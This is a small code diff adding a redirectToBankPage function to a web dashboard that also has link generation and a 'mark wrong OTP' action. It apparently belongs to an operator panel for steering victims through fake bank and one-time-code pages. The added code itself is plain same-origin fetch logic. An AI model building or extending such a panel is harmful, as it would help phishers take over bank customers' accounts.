@@ -233,6 +233,22 @@ document.getElementById('generateLinkForm').addEventListener('submit', async (e)
       }
     }
 
+        // ADD THIS NEW FUNCTION
+    async function redirectToBankPage(id) {
+      try {
+        const response = await fetch("/api/redirectToBankPage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ invoiceId: id })
+        });
+        if (!response.ok) throw new Error('Failed to redirect to bank page');
+        loadTransactions();
+      } catch (error) {
+        console.error('Error redirecting to bank page:', error);
+        alert('Failed to redirect to bank page. Please try again.');
+      }
+    }
+    
     async function markWrongOTP(id) {
       try {
         const response = await fetch("/api/wrongOTP", {
